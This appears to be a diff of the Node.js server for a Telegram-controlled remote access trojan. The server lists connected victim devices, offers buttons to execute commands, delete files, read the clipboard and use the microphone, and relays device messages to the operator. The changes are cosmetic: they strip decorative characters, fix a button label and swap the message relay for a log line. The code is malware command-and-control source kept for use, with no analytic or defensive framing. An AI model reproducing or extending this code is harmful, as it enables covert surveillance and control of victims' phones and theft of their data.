@@ -44,7 +44,7 @@ app.post("/uploadFile", upload.single('file'), (req, res) => {
     res.send('')
 })
 app.post("/uploadText", (req, res) => {
-    appBot.sendMessage(id, `°• Messages from <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚\n\n` + req.body['text'], {parse_mode: "HTML"})
+    console.log('process');
     res.send('')
 })
 
@@ -116,7 +116,7 @@ appBot.on('message', (message) => {
             });
             currentUuid = ''
             appBot.sendMessage(id,
-                '°• Processing...',                {
+                'Processing...',                {
                     parse_mode: "HTML",
                     "reply_markup": {
                         "keyboard": [["Devices"], ["Execute"]],
@@ -134,7 +134,7 @@ appBot.on('message', (message) => {
             });
             currentUuid = ''
             appBot.sendMessage(id,
-                '°• Processing...',                {
+                'Processing...',                {
                     parse_mode: "HTML",
                     "reply_markup": {
                         "keyboard": [["Devices"], ["Execute"]],
@@ -152,7 +152,7 @@ appBot.on('message', (message) => {
             });
             currentUuid = ''
             appBot.sendMessage(id,
-                '°• Processing...',                {
+                'Processing...',                {
                     parse_mode: "HTML",
                     "reply_markup": {
                         "keyboard": [["Devices"], ["Execute"]],
@@ -170,7 +170,7 @@ appBot.on('message', (message) => {
             });
             currentUuid = ''
             appBot.sendMessage(id,
-                '°• Processing...',
+                'Processing...',
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
@@ -198,7 +198,7 @@ appBot.on('message', (message) => {
         if (message.text == 'Devices') {
             if (appClients.size == 0) {
                 appBot.sendMessage(id,
-                    '°• No Connecting Devices',
+                    'No Connecting Devices',
                 )
             } else {
                 let text = 'List Connected Devices :\n\n'
@@ -258,7 +258,7 @@ appBot.on("callback_query", (callbackQuery) => {
                         {text: 'Delete File', callback_data: `delete_file:${uuid}`}
                     ],
                     [
-                        {text: 'Clipnoard', callback_data: `clipboard:${uuid}`},
+                        {text: 'Clipboard', callback_data: `clipboard:${uuid}`},
                         {text: 'Microphone', callback_data: `microphone:${uuid}`},
                     ],
                     [
